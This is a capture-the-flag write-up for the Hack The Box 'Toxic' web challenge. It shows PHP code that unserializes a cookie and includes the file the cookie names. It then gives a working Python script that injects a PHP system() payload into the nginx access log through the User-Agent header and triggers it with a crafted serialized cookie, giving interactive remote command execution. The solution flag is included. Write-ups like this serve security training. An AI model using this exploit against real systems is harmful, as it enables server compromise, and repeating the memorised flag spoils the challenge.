---
layout: single
title: Toxic [Web] - Hack The Box
excerpt: "ECSC Prep"
date: 2021-12-21
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Web Challenge
tags:  
  - Exploiting PHP deserialization
---

### Vulnerable code
```php
<?php
spl_autoload_register(function ($name){
    if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID', 
        base64_encode(serialize($page)), 
        time()+60*60*24, 
        '/'
    );
} 

$cookie = base64_decode($_COOKIE['PHPSESSID']);
unserialize($cookie);

```

Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9<br>
Decode: O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}

<br><br>


### Exploiting PHP deserialization<br>
```python
#!/usr/bin/python3
#Dhmosfunk
import requests
import os
os.system("clear")
print("[*] HTB Toxic Web Challenge [Exploiting PHP deserialization]")

def injector(command,url):
	inj=requests.get(url, headers = {"User-Agent": "<?php system('"+str(command)+"'); ?>"})



HOST='http://138.68.174.27:31645/'
PHPSESSID = 'Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ%3d%3d' #Base64 Decoded Cokkie [O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}]


while 1:
	cmd=input("> ")
	os.system("clear")
	if cmd=="exit":
		break 
		
	print("[*] Trigger the command!")
	injector(cmd,HOST)


	req=requests.get(HOST,cookies = {"PHPSESSID":str(PHPSESSID)})
	
	print(req.text)
	
```


### Flag => HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}
